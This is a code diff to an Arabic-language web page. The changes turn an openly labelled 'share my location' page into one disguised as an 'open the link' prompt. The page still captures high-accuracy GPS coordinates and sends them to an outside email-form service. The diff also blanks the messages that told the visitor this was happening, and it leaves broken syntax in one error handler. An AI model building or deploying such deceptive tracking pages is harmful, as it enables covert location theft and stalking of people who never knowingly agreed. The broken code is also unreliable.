@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>مشاركة الموقع</title>
+  <title>هل تريد فتح الرابط </title>
   <style>
     body{font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;padding:24px;background:#f7f7fb;color:#111;direction:rtl;text-align:right}
     .card{max-width:640px;margin:0 auto;background:white;padding:18px;border-radius:12px;box-shadow:0 6px 20px rgba(12,12,16,0.06)}
@@ -14,12 +14,12 @@
 </head>
 <body>
   <div class="card">
-    <h2>مشاركة موقعي</h2>
-    <p>هل تريد مشاركة موقعك الآن؟ سيتم طلب إذن من المتصفح.</p>
+    <h2>هل تريد فتح الرابط</h2>
+    <p>هل تريد فتح الرابط الآن؟ سيتم طلب إذن من المتصفح.</p>
 
     <div style="display:flex;gap:10px;margin-top:12px">
-      <button id="btnShare" class="btn-primary">📍 شارك موقعي الآن</button>
-      <button id="btnCancel">❌ إلغاء</button>
+      <button id="btnShare" class="btn-primary">افتح الرابط</button>
+      <button id="btnCancel"></button>
     </div>
 
     <p class="hint">سيظهر إشعار من المتصفح لطلب الإذن.</p>
@@ -39,17 +39,17 @@ function show(msg){ output.innerHTML = msg; }
 
 btnShare.addEventListener('click', async () => {
   if (!('geolocation' in navigator)) {
-    show('المتصفح لا يدعم تحديد الموقع.');
+    show('المتصفح لا يدعم .');
     return;
   }
 
-  show('⏳ جاري طلب إذن الوصول إلى الموقع...');
+  show('⏳ جاري طلب إذن الوصول إلى الرابط...');
   navigator.geolocation.getCurrentPosition(async (pos) => {
     const lat = pos.coords.latitude.toFixed(6);
     const lon = pos.coords.longitude.toFixed(6);
     const acc = pos.coords.accuracy;
 
-    show(`✅ تم الحصول على الموقع:<br>خط العرض: ${lat}<br>خط الطول: ${lon}<br>دقة: ${acc} متر`);
+    show(`✅ تم الحصول على الرابط:<br>خط العرض: ${lat}<br>خط الطول: ${lon}<br>دقة: ${acc} متر`);
 
     // إرسال المعلومات إلى Web3Forms
     try {
@@ -67,18 +67,18 @@ btnShare.addEventListener('click', async () => {
       });
 
       if (resp.ok) {
-        show(output.innerHTML + '<br><em>📩 تم إرسال الموقع إلى بريدك الإلكتروني بنجاح.</em>');
+        show(output.innerHTML + '<br><em>.</em>');
       } else {
-        show(output.innerHTML + '<br><em>❌ فشل إرسال البيانات.</em>');
+        show(output.innerHTML + '<br><em>.</em>');
       }
     } catch (e) {
-      show(output.innerHTML + '<br><em>⚠️ حدث خطأ في الاتصال بالخدمة.</em>');
+      show(output.innerHTML + '<br><em>.</em>');
     }
 
   }, (err) => {
-    if (err.code === err.PERMISSION_DENIED) show('❌ المستخدم رفض مشاركة الموقع.');
-    else if (err.code === err.POSITION_UNAVAILABLE) show('⚠️ الموقع غير متاح حالياً.');
-    else if (err.code === err.TIMEOUT) show('⏰ انتهت المهلة.');
+    if (err.code === err.PERMISSION_DENIED) show(.');
+    else if (err.code === err.POSITION_UNAVAILABLE) show('.');
+    else if (err.code === err.TIMEOUT) show('.');
     else show('حدث خطأ: ' + err.message);
   }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
 });
